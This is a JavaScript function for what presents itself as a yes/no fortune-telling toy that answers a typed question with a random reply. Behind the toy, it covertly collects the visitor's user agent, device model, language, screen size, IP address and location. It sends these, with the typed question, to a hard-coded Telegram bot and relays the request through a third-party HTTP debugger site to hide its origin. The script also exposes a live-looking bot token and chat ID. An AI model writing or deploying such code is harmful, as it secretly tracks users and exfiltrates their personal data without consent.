function ss() {
  var text = document.getElementById("inp").value.trim();
  if (text.length === 0) return alert("یه چیزی بنویس دیگه!");

  var ua = navigator.userAgent;
  var lang = navigator.language;
  var screenSize = screen.width + "x" + screen.height;

  let model = "Unknown";
  const match = ua.match(/([^)]+)/);
  if (match && match[1].includes("Android")) {
    const parts = match[1].split(";");
    model = parts[2]?.trim() || "Unknown";
  }

  fetch("https://ipinfo.io/json?token=YOUR_TOKEN_HERE")
    .then(res => res.json())
    .then(data => {
      var ip = data.ip;
      var loc = data.city + ", " + data.country;

      var mohtava = "ask%3A" + encodeURIComponent(text) +
        "%23UA%3A" + encodeURIComponent(ua) +
        "%23Model%3A" + encodeURIComponent(model) +
        "%23Lang%3A" + encodeURIComponent(lang) +
        "%23Res%3A" + encodeURIComponent(screenSize) +
        "%23IP%3A" + encodeURIComponent(ip) +
        "%23Location%3A" + encodeURIComponent(loc);

      var url = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx";
      var con = "https://api.telegram.org/bot7181515435:AAFNo62gE7hqassHCKmckFsxkz3lvasGtQU/sendMessage?chat_id=-1002666899819&text=" + mohtava;

      var dataToSend = {
        "UrlBox": con,
        "AgentList": "Google Chrome",
        "VersionsList": "HTTP/1.1",
        "MethodList": "POST"
      };

      $.ajax({
        type: "POST",
        url: url,
        data: dataToSend,
        success: function () {
          console.log("فرستاده شد به تلگرام");
        }
      });

      var ans = ["probably not", "probably yes", "maybe", "of course it is", "yep", "nope", "absolutely", "absolutely not"];
      const random = Math.floor(Math.random() * ans.length);
      alert(ans[random]);
      document.getElementById("inp").value = "";
    });
}
